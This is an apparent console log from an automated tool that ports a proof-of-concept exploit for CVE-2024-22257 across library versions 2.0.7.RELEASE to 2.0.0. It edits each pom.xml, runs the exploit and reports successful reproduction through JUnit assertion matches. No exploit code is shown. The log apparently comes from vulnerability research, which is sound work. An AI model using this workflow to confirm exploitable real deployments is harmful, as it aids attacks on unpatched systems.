[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.7.RELEASE/exploit[0m
[96m[Preparer] Updating dependency version to 2.0.7.RELEASE in /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.7.RELEASE/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.0.7.RELEASE in /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.7.RELEASE/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.0.7.RELEASE...[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.7.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.ComparisonFailure'[0m
[92m[Verifier] âœ“ Detail matched: '<[]1>'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.0.7.RELEASE[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2024-22257/2.0.7.RELEASE[0m
[96m[Selector] Nearest need adapatation version selected: 2.0.6.RELEASE[0m
[96m[Selector] Closest reproduced version: 2.0.7.RELEASE at index 7[0m
[96m[Adapter] Trying next closest version: 2.0.6.RELEASE[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2024-22257/2.0.7.RELEASE/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.6.RELEASE/exploit[0m
[96m[Preparer] Updating dependency version to 2.0.6.RELEASE in /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.6.RELEASE/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.0.6.RELEASE in /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.6.RELEASE/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.0.6.RELEASE...[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.6.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.ComparisonFailure'[0m
[92m[Verifier] âœ“ Detail matched: '<[]1>'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.0.6.RELEASE[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2024-22257/2.0.6.RELEASE[0m
[96m[Selector] Nearest need adapatation version selected: 2.0.5.RELEASE[0m
[96m[Selector] Closest reproduced version: 2.0.6.RELEASE at index 6[0m
[96m[Adapter] Trying next closest version: 2.0.5.RELEASE[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2024-22257/2.0.6.RELEASE/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.5.RELEASE/exploit[0m
[96m[Preparer] Updating dependency version to 2.0.5.RELEASE in /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.5.RELEASE/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.0.5.RELEASE in /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.5.RELEASE/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.0.5.RELEASE...[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.5.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.ComparisonFailure'[0m
[92m[Verifier] âœ“ Detail matched: '<[]1>'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.0.5.RELEASE[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2024-22257/2.0.5.RELEASE[0m
[96m[Selector] Nearest need adapatation version selected: 2.0.4[0m
[96m[Selector] Closest reproduced version: 2.0.5.RELEASE at index 5[0m
[96m[Adapter] Trying next closest version: 2.0.4[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2024-22257/2.0.5.RELEASE/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.4/exploit[0m
[96m[Preparer] Updating dependency version to 2.0.4 in /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.4/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.0.4 in /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.4/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.0.4...[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.4...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.ComparisonFailure'[0m
[92m[Verifier] âœ“ Detail matched: '<[]1>'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.0.4[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2024-22257/2.0.4[0m
[96m[Selector] Nearest need adapatation version selected: 2.0.3[0m
[96m[Selector] Closest reproduced version: 2.0.4 at index 4[0m
[96m[Adapter] Trying next closest version: 2.0.3[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2024-22257/2.0.4/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.3/exploit[0m
[96m[Preparer] Updating dependency version to 2.0.3 in /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.3/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.0.3 in /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.3/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.0.3...[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.3...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.ComparisonFailure'[0m
[92m[Verifier] âœ“ Detail matched: '<[]1>'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.0.3[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2024-22257/2.0.3[0m
[96m[Selector] Nearest need adapatation version selected: 2.0.2[0m
[96m[Selector] Closest reproduced version: 2.0.3 at index 3[0m
[96m[Adapter] Trying next closest version: 2.0.2[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2024-22257/2.0.3/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.2/exploit[0m
[96m[Preparer] Updating dependency version to 2.0.2 in /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.2/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.0.2 in /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.2/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.0.2...[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.2...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.ComparisonFailure'[0m
[92m[Verifier] âœ“ Detail matched: '<[]1>'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.0.2[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2024-22257/2.0.2[0m
[96m[Selector] Nearest need adapatation version selected: 2.0.1[0m
[96m[Selector] Closest reproduced version: 2.0.2 at index 2[0m
[96m[Adapter] Trying next closest version: 2.0.1[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2024-22257/2.0.2/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.1/exploit[0m
[96m[Preparer] Updating dependency version to 2.0.1 in /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.1/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.0.1 in /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.1/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.0.1...[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.1...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.ComparisonFailure'[0m
[92m[Verifier] âœ“ Detail matched: '<[]1>'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.0.1[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2024-22257/2.0.1[0m
[96m[Selector] Nearest need adapatation version selected: 2.0.0[0m
[96m[Selector] Closest reproduced version: 2.0.1 at index 1[0m
[96m[Adapter] Trying next closest version: 2.0.0[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2024-22257/2.0.1/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.0/exploit[0m
[96m[Preparer] Updating dependency version to 2.0.0 in /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.0/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.0.0 in /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.0/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.0.0...[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.ComparisonFailure'[0m
[92m[Verifier] âœ“ Detail matched: '<[]1>'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.0.0[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2024-22257/2.0.0[0m
[93m[Selector] No pending versions available.[0m
[91m[Main] No suitable version found for further adaptation. Stopping.[0m
[1m[Main] === Adaptation process complete ===[0m
[92m[Main] Total reproduced versions: 210[0m
